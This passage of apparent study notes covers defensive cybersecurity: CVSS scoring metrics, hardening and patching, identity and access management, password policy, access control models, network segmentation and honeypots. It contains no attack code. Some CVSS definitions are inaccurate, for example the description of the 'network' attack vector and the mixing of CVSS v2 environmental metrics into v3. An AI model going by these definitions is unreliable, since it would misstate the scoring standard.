	- **Attack Vector (AV):** This metric describes how the vulnerability can be exploited. It can be either "network" if the attacker must be on the same network as the target system, or "adjacent" if the attacker must have access to the same physical or logical network segment as the target system, or "local" if the attacker must have local access to the target system, or "physical" if the attacker must have physical access to the target system, or "unknown" if it is unclear how the vulnerability can be exploited.
	- **Attack Complexity (AC):** This metric describes how complex the attack must be to exploit the vulnerability. It can be either "low" if no special conditions are required to exploit the vulnerability, or "high" if special conditions must exist to exploit the vulnerability.
	- **Privileges Required (PR):** This metric describes the level of privileges an attacker must have to exploit the vulnerability. It can be either "none" if the attacker does not require any privileges, or "low" if the attacker requires some privileges but not all, or "high" if the attacker requires all privileges.
	- **User Interaction (UI):** This metric describes whether the attacker must interact with the user to exploit the vulnerability. It can be either "none" if the vulnerability can be exploited without any user interaction, or "required" if the attacker must trick the user into taking some action, or "unknown" if it is unclear whether user interaction is required.
	- **Scope (S):** This metric describes whether the vulnerability affects just the vulnerable component or can impact other components or the entire system. It can be either "unchanged" if the vulnerability affects only the vulnerable component, or "changed" if the vulnerability affects other components or the entire system.
	- **Confidentiality (C), Integrity (I), and Availability (A):** These metrics describe the impact on confidentiality, integrity, and availability of the vulnerable system or data. Each metric can be scored from "none" to "high", depending on the severity of the impact.

2. **Temporal metrics:** These metrics may change over time as more information becomes available about the vulnerability or as patches are released. They include the following:

	- **Exploit Code Maturity (E):** This metric describes the likelihood that an exploit for the vulnerability will be developed or discovered in the near future. It can be either "not defined" if it is not known whether an exploit exists or is likely to be developed, or "unproven" if an exploit is not known to exist, or "proof-of-concept" if an exploit has been developed but is not widely available, or "functional" if an exploit is available and works reliably, or "high" if an exploit is available and is being actively used in the wild.

	- **Remediation Level (RL):** This metric describes the availability of a fix or workaround for the vulnerability. It can be either "not defined" if it is not known whether a fix or workaround exists, or "official fix" if a fix is available from the vendor or developer, or "temporary fix" if a workaround or mitigation is available, or "workaround" if a temporary fix is available but it requires significant effort or resources to implement, or "unavailable" if no fix or workaround is available.
	- **Report Confidence (RC):** This metric describes the level of confidence in the information that is available about the vulnerability. It can be either "unknown" if it is unclear how reliable the information is, or "unconfirmed" if the vulnerability has not been confirmed, or "uncorroborated" if the vulnerability has been reported but the information cannot be independently verified, or "confirmed" if the vulnerability has been confirmed by the vendor or a reliable third party.
	
3. **Environmental metrics:** These metrics describe the impact of the vulnerability on a specific environment or set of conditions. They include the following:

	- **Collateral Damage Potential (CDP):** This metric describes the potential impact of the vulnerability on components or systems that are not directly targeted by the attack. It can be either "none" if the attack only affects the vulnerable component, or "low" if the attack affects other components or systems but does not cause significant damage, or "low-medium", "medium-high", or "high" depending on the severity of the collateral damage.
	- **Target Distribution (TD):** This metric describes the proportion of vulnerable systems that are likely to be targeted in an attack. It can be either "none" if the vulnerability is not widespread, or "low" if only a small proportion of vulnerable systems are likely to be targeted, or "medium" or "high" depending on the likelihood of a large-scale attack.
	- **Confidentiality (C), Integrity (I), and Availability (A) Requirements (CR, IR, AR):** These metrics describe the importance of confidentiality, integrity, and availability to the organization or system that is affected by the vulnerability. Each metric can be scored from "none" to "high", depending on the importance of the affected asset to the organization or system.

Once these metric values are determined, the CVSS formula is applied to calculate the base score, which ranges from 0 to 10, with 10 being the most severe. The formula takes into account the values of the Base metrics, with a weight assigned to each metric based on its importance. The Temporal and Environmental metric values can be used to adjust the Base score to more accurately reflect the severity of the vulnerability in a specific context.

![CVSS Schema](cvss.jpg)

---

# Mitigating Vulnerabilities 

When a vulnerability is found, is important  to prioritize its' mitigation. However, if the risk is low or it doesn't justify the cost to mitigate it, it could be **accepted** and not mitigated. Even if a risk is accepted, it still should be monitored. 

## Hardening and Patching

**Hardening** is the process by which a host or other device is made more secure through the reduction of that device's attack surface (services and interfaces that allow a user to comunicate with the system). Any service or interface that is enabled through the default installation and left unconfigured should be considered a vulnerability. 

This checklist may help with hardening and reduce the attack surface: 
1. Remove or disable devices that are not needed or used
2. Install OS, application, firmware, and driver patches regularly
3. Uninstall all unnecessary network protocols
4. Uninstall or disable all unnecessary services and shared folders
5. Enforce Access Control Lists on all system resources
6. Restrict user accounts to the least privileges needed
7. Secure the local admin or root account by renaming it and changing password
8. Disable unnecessary default user and group accounts
9. Verify permissions on system accounts and groups
10. Install antimalware software and update its definitions regularly

About the 2nd action in the checklist, patches can be classified as critical, security-critical, recommended and optional. However, patching a system may require to reboot systems and stop critical systems. 

## Remmediation Issues 

Remmediating a vulnerability may not be easy. Some difficulties can be encountered like: 

- **Legacy Systems** that are not longed supported by its vendor and it doesn't has security updates. 
- **Proprietary Systems** owned by its developer or vendor and they may not support with remediating the vulnerability. 
- **Organizational Governance**, that are systems by which an organitzation makes and implements decisions in pursuit if its objectives. 
- **Business Process Interruption** may occur while patching and the organitzation may won't be able to operate during this time. 
- **Degrading Functionality:** A period of time when an organizationâs systems are not performing at peak functionality, which could lead to business process interruption.

While working with vendors or other organitzations, is important to understand what is a MOU and a SLA: 
- **Memorandum of Understanding (MOU):** Usually a preliminary or exploratory agreement to express an intent to work together that is not legally binding and does not involve the exchange of money. 
- **Service Level Agreement (SLA):** A contractual agreement setting out the detailed terms under which an ongoing service is provided (timings, costs, etc.)

---

# Identity and Access Management

Identity and Access Management (IAM) is a framework of policies, technologies, and processes that enable organizations to manage digital identities and control access to their IT resources. The IAM process is a set of activities that ensures that only authorized individuals can access resources and data within an organization.

In a IAM system, is important to have reports regarding: 
- Created and deprovisioned accounts
- Managed accounts
- Audit accounts
- Identity-based threats
- Compliance (User accounts, shared acounts, service accounts, privileged accounts, etc.)

## Roles

If there are different ussers/assets that require the same permissions, **Roles** can facilitate the management of them. A role is a collection of permissions that define a user's access to resources within an organization. Roles simplify access management by enabling administrators to assign permissions to groups of users based on their job functions or responsibilities. If a change is required in the permisions, by only modifying the permisions that the role define, all the users with the role assigned will be affected. 


## Passwords

**Password Policies** are a rules that promotes strong passwords to avoid the usage of really easy passwords that can be brute forced in seconds. 
Even though in a lot of organitzations the password policy defines a password complexity and aging policy, they are not recommended. In a good password policy: 
- Complexity rules should not be enforced: While complexity rules such as requiring a mix of upper and lower case letters, numbers, and special characters can help make passwords stronger, they can also make them harder to remember. This can lead to users writing down their passwords, reusing the same passwords, or choosing weak passwords that meet the complexity requirements. Instead, it is recommended to use passphrases or longer passwords that are easy to remember but difficult to guess or crack.
- Aging policies should not be enforced: Aging policies require users to change their passwords periodically, typically every 90 days or so. However, this can lead to users choosing weak passwords that are easy to remember or simply changing one character in their old password to meet the policy requirements. This can also lead to frustration and increased support requests. Instead, it is recommended to encourage users to choose strong, unique passwords and only require password changes if there is a suspicion of compromise or if a password has been exposed.
- Password hints should not be used: Password hints can help users remember their passwords, but they can also give attackers clues to guess or crack a password. For example, a password hint of "my pet's name" can be easily guessed with a little research. Instead of using password hints, users should be encouraged to use password managers or other secure methods of password storage.

The best way to secure a logon is to make use of Multi factor Authentication process (**MFA**). In a MFA you have to make use of something you know (the password) and something you have (a card, mobile device, etc.). Two-factor authentication (2FA) is a type of MFA where you only need two factors of authentication whereas MFA implies two or more. 

**Single-Sign-On** is another authentication technology that enables a user to authenticate once and receive authorizations for multiple services. It has the benefits that the user does not require different accounts for different services, but the disadvantage is that if the account is compromised, the attacker has access to everything. 

## Certificates

The identity of machines and applications has to be managed using digital certificates, that allow SSL/TLS protocol and secure connections. The certificates have to be issued, updated, and revoked in the certificate management process. 

## Federation

**Federation** refers to a mechanism that allows different organizations or systems to share user identity and authentication information with each other. It is a way to establish trust and enable collaboration between different entities without the need for users to have separate identities and passwords for each system. 
 
Federation works by establishing a trust relationship between identity providers (IdP) and service providers (SP). The IdP is responsible for authenticating the user and providing identity information, while the SP is responsible for providing access to a resource or service based on the user's identity. When a user attempts to access a resource provided by an SP, the SP requests authentication from the user's IdP. If the user is authenticated successfully, the IdP provides the user's identity information to the SP, which then uses this information to grant access to the requested resource.

Federation is commonly used in enterprise environments, as well as in cloud-based systems, social media platforms, and other online services. Some examples of federation protocols and standards include SAML (Security Assertion Markup Language), OpenID Connect, and OAuth.

## Privilege Management

The use of authentication and authorization mechanisms to provide an administrator with centralized or decentralized control of user and group role-based privilege management. There are different access control types: 

- **Discretionary Access Control (DAC):** Each resource is protected by an Access Control list (ACL) managed by the resource owner. 
- **Mandatory Access Control (MAC):** The MAC system works by assigning labels to both users and resources. These labels define the security level of the users and resources, and are used to determine whether a user is authorized to access a particular resource.
- **Role-Based Access Control (RBAC):** Resources are protected by ACLs that are managed by administrators and that provide user permissions based on job functions (Roles/Groups)
- **Attribute-Based Access Control (ABAC):** ABAC works by defining policies that specify the attributes that are required for access to a particular resource. The attributes used in ABAC can include a wide range of information, such as user role, job title, location, time of day, and device type.
---

# Network Architecture and Segmentation

## Asset Tag

Tagging assets is the practice of assigning an ID to the network assets and associate them with entries in inventories and databases. This tags can be barcodes, RFID, or unique identificatiors. 

## Change Management

A change management is the process where changes to the configuration of information systems are monitored and controlled. It helps to mantain a history of all changes that has been applied on an asset. That's why each individual component should have a separate document or database record that mantains its initial state and all subsequent changes. 

Changes are categorized according to their potential impact and level of risk: 
- Major
- Signigicant
- Minor
- Normal

**Request for Change (RFC)** is a document that has to be submitted when asking for a change. It contains the reasons for a change and the procedures to implement it. Major or signigicant changes have to be approved by the **Change Advisory Broad (CAB)** The CAB is typically made up of representatives from different departments or areas of the organization, including IT, operations, security, and business stakeholders. 
Changes should be accompanied by a rollback or remediation plan in case an error occurs. 

## Network Architecture

When talking about network architecture and infrastructure, is important to understand this concepts: 

- **Physical Network:** refers to all physicall assets, cabling, switch ports, routers, access points, etc that suppy connectivity. Physical security controls are important to protect the fisical network. 

- **Virtual Private Network (VPN):** A VPN is a secure tunneled created between two endpoints connected via unsecure network, like public internet. Using authentication and authorization mechanisms, a user can access a private network from another private network like if the user was physically there. IPSec, SSH and TLS are protocols used to create this tunneled connection. 

- **Software-Defined Networking (SDN):** is an approach that separates the control and data planes of a network, enabling centralized control and management of network functions through software. This allows for more agile and flexible network management, automation of tasks, and faster response to changing business needs. With SDN, the control plane is decoupled from the physical network hardware and is managed through a centralized software-based controller. The controller provides a programmatic interface for managing and controlling the network, allowing network administrators to automate tasks, define network policies, and create and manage network services through software.
	- Control Plane: Is responsible for managing the network, including configuring and maintaining routing tables, network policies, and security settings. It is responsible for directing network traffic and managing network functions.
	- Data Plane: Is responsible for forwarding network traffic, including packets and frames, from one network device to another. It executes the instructions provided by the control plane, forwarding network traffic based on the routing tables and policies defined by the control plane.
	- Management Plane: Monitors traffic conditions and network status. A SDN application can define policy decisios on the control plane based on the status. 

## Segmentation 

Segmentation refers to the process of dividing a network into smaller, more manageable subnetworks or segments. This can be done by creating virtual LANs (VLANs) or by dividing the network into separate physical subnets. There are different ways to segmentate a network: 

- **System Isolation or Air Gap:** It involves physically isolating a computer or network from other networks or devices, including the internet.The purpose of air-gapping is to create a highly secure environment that is resistant to cyber attacks and data exfiltration. By physically isolating a system, it is much more difficult for hackers or malware to gain unauthorized access or extract sensitive information from the system.

- **Physical Segmentation:** Each network segment has its own switch, and only devices connected to that switch can communicate with each other

- **Virtual Segmentation:** Virtual segmentation allows different segments of a network to be isolated from each other while still sharing the same physical infrastructure. They  can be implemented using different technologies, such as VLANs, software-defined networking (SDN), or virtual private networks (VPNs). VLANS (or Virtual Local Area Network) allow different groups of devices to be logically separated from each other, even if they are physically connected to the same network infrastructure.


A **Zone** is the main unit of a logically segmented network where the security configuration is the same for all hosts within it. 

### DMZ and Jumpbox

A **Demilitarized Zone (DMZ)** is a isolated segment from the rest of the private network (by one or more firewalls) and the devices of this zone accept trafic from the internet over designated ports. Everithing behind the DMZ has to be invisible to the Internet. 

A **Bastion Host** is a special-purpose computer that is hardened and secured to resist attacks from potential intruders on a network. It is usually placed at the boundary of a network to protect internal resources from external threats (between the DMZ and the private network). The primary role of a bastion host is to provide a single point of entry to a network for authorized users. Bastion hosts typically run specialized software, such as firewalls, intrusion detection/prevention systems, and VPN servers, to provide secure access to network resources. 

A **jumpbox** is a computer that is used to access and manage other computers in a network, typically through remote administration tools such as SSH (Secure Shell) or RDP (Remote Desktop Protocol). Jumpboxes are usually configured with a minimal set of tools and utilities to reduce the attack surface, and are subject to strict access controls and security policies.

## Virtualization

Virtualization is a technology that allows multiple operating systems and applications to run on a single physical computer, called a host, by creating virtual machines (VMs) that mimic the behavior of a real computer. Each VM is an isolated environment that runs its own operating system and applications, and has access to a portion of the host's resources, such as CPU, memory, storage, and network connectivity.

It enables efficient use of hardware resources, since multiple VMs can run on a single physical server, and allows for flexible and scalable deployment of applications and services. 

**VDI (Virtual Desktop Infrastructure)** is a technology that allows desktop operating systems to run on virtual machines (VMs) hosted on a central server or data center. The server performs all the application processing and data storage. 

**Containerization** is a type of virtualization applied by a host operating system to provision an isolated execution environment for an application. It allows applications to be packaged and deployed in a lightweight, portable, and isolated environment called a container. Containers provide a way to run applications and their dependencies consistently across different computing environments, such as development, testing, and production, without requiring changes to the underlying infrastructure.

## Honeypots

A honeypot is a decoy system or network that appears to be a legitimate target but is actually designed to lure attackers away from critical systems or applications, and to gather information about their tactics, techniques, and procedures (Attribution).

A honeynet is a entire network setup to entice attackers. 


